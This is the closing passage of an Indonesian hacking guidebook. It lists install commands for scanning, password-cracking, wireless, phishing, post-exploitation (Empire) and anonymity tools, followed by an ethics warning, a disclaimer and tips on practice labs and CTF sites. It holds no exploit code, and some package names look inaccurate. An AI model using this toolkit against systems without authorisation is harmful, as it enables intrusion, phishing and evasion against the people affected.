apt update && apt upgrade -y

# Tools dasar
apt install -y git python3 python3-pip php curl wget netcat-openbsd

# Tools hacking
apt install -y nmap metasploit-framework sqlmap aircrack-ng hydra john hashcat

# Tools web
apt install -y burpsuite owasp-zap nikto dirb gobuster

# Tools wireless
apt install -y aircrack-ng aireplay-ng airodump-ng wifite

# Tools OSINT
apt install -y theharvester recon-ng maltego

# Tools password
apt install -y john hashcat hydra crunch cewl

# Tools exploitation
apt install -y exploitdb searchsploit

# Tools forensics
apt install -y autopsy sleuthkit

# Tools reverse engineering
apt install -y radare2 ghidra

# Tools sniffing
apt install -y wireshark tcpdump ettercap-graphical

# Tools social engineering
apt install -y setoolkit

# Tools anonymity
apt install -y tor proxychains macchanger
```

## 17.2 Tools dari GitHub

```bash
# PhoneInfoga
git clone https://github.com/sundowndev/phoneinfoga.git

# Social-Engineer Toolkit
git clone https://github.com/trustedsec/social-engineer-toolkit.git

# Gophish
git clone https://github.com/gophish/gophish.git

# Empire (post-exploitation)
git clone https://github.com/BC-SECURITY/Empire.git

# Starkiller (GUI for Empire)
git clone https://github.com/BC-SECURITY/Starkiller.git
```

---

# BAB 18: PERINGATAN ETIKA & DISCLAIMER

## 18.1 Peringatan Etika Hacking

Ini bagian paling penting dari buku ini. Baca baik-baik.

**Hacking tanpa izin adalah ilegal.**

- Meretas sistem orang lain tanpa izin adalah kejahatan di hampir semua negara
- Kamu bisa dipenjara, didenda, atau keduanya
- Korban bisa menuntut kamu secara hukum
- Jejak digital itu susah dihapus total

**Aturan main yang harus kamu ikutin:**

1. **Hanya retas sistem MILIK SENDIRI** atau yang kamu punya izin tertulis
2. **Bug bounty** — ikutin program bug bounty yang legal
3. **CTF (Capture The Flag)** — latihan di environment yang aman
4. **Lab sendiri** — bikin lab di rumah buat latihan
5. **Jangan pernah** meretas untuk kejahatan, pencurian, atau merugikan orang lain

## 18.2 Disclaimer

```javascript
PENAFIAN:

Buku ini ditulis untuk tujuan EDUKASI dan BELAJAR KEAMANAN SIBER saja.

Penulis tidak bertanggung jawab atas penyalahgunaan informasi dalam buku ini.

Semua teknik yang dijelaskan di sini hanya boleh digunakan pada:
1. Sistem milik sendiri
2. Sistem yang kamu punya izin tertulis untuk diuji
3. Environment lab/CTF yang legal
4. Program bug bounty yang resmi

Jika kamu menggunakan teknik dalam buku ini untuk kejahatan, itu adalah tanggung jawab kamu sepenuhnya. Penulis tidak akan membantu, mendukung, atau bertanggung jawab atas tindakan ilegal kamu.

INGAT: Hacking tanpa izin adalah ilegal. Jangan lakukan.
```

---

# BAB 19: TIPS & TRIK TAMBAHAN

## 19.1 Bikin Lab Latihan Sendiri

```bash
# Install VirtualBox
apt install virtualbox

# Download VM vulnerable
# - Metasploitable 2
# - DVWA (Damn Vulnerable Web App)
# - OWASP Juice Shop

# Jalankan di VirtualBox
# Latihan meretas di sini, aman dan legal
```

## 19.2 Ikut CTF Online

- HackTheBox (hackthebox.com)
- TryHackMe (tryhackme.com)
- VulnHub (vulnhub.com)
- PicoCTF (picoctf.com)

## 19.3 Sertifikasi yang Bisa Diambil

- CEH (Certified Ethical Hacker)
- OSCP (Offensive Security Certified Professional)
- CompTIA Security+

## 19.4 Komunitas & Forum

- Reddit r/hacking
- Reddit r/netsec
- Forum Kali Linux

---

# PENUTUP

Buku ini udah lengkap. Semua yang kamu butuhin ada di sini. Tapi ingat — dengan great power comes great responsibility.

Jangan jadi hacker jahat. Jadi hacker yang beneran jago, yang dihormatin, yang dibayar mahal buat ngetes keamanan sistem.

Kalau kamu benerin passion di dunia keamanan siber, kamu bisa dapet kerjaan yang bagus, gaji tinggi, dan dihormatin sama banyak orang.

Tapi kalau kamu jadi hacker jahat, kamu bakal dikejar-kejar polisi, dipenjara, dan hidup kamu rusak.

Pilihan ada di tangan kamu.

---

**Ditulis oleh [K] untuk WVERZNXRL**

**"Dengan ilmu ada tanggung jawab. Gunakan dengan bijak."**

---

*Selesai.*